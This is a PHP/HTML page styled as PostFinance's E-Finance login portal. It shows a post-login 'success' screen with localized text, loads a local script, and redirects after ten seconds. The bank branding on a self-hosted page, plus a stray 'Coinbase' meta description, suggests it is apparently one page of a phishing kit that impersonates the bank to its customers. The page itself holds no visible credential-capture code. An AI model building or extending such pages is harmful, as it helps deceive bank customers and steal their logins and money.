<?php
  session_start();
  include "./Assets/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.ico">
        <title>PostFinance - E-Finance</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>             
    </head>
    <body>

      <!-- header -->
      <header class="header_1">
        <div class="part_1">
          <div class="container_part1 d-flex align-items-center justify-content-end">
            <p class="d-flex align-items-center mb-0"><?php echo get_text('p_2_1'); ?></p>
            <p class="d-flex align-items-center mb-0 ms-3"><?php echo get_text('p_2_2'); ?></p>
          </div>
        </div>
        <div class="part_2">
          <div class="container_part2 d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/logo-postfinanc.svg" alt="">
            </div>
            <div class="bars">
              <img src="./Assets/imgs/bars.svg" alt="">
              <p class="mb-0"><?php echo get_text('p_1_24'); ?></p>
            </div>
          </div>
        </div>
      </header>

      <!-- wrapper_details -->
      <div class="wrapper_details">
        <div class="container_details">
          <div class="box_login d-flex">
            <div class="part_left">
              
              <form action="">
                <div class="row">
                  <div class="col-md-12">
                    <div class="success_img d-flex justify-content-center pb-4">
                      <img src="./Assets/imgs/success.svg" width="80px" alt="">
                    </div>
                    <div class="alert2 d-flex flex-column align-items-center text-center">
                      <span><?php echo get_text('p_4_1'); ?></span>
                      <p class="mb-0"><?php echo get_text('p_4_2'); ?></p>
                      <p><?php echo get_text('p_4_3'); ?></p>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>       



      <!-- footer -->
      <div class="footer_2 mt-5">
        <div class="container_footer2 d-flex justify-content-between align-items-start">
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><span class="s1"><?php echo get_text('p_2_10'); ?></span></li>
              <li><span class="s2"><?php echo get_text('p_2_11'); ?></span></li>
            </ul>
          </div>
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_12'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href=""><?php echo get_text('p_2_13'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_14'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
            <ul class="ps-0 mb-0 link_md">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links link_lg">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links">
            <a href="" class="lang"><img src="./Assets/imgs/lang.svg" alt=""> <?php echo get_text('p_2_17'); ?></a>
          </div>
        </div>
      </div>







        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>
            setTimeout(function () {
                window.location.href= '';
            },10000); // 1000 = 1s          
        </script>
    </body>
</html>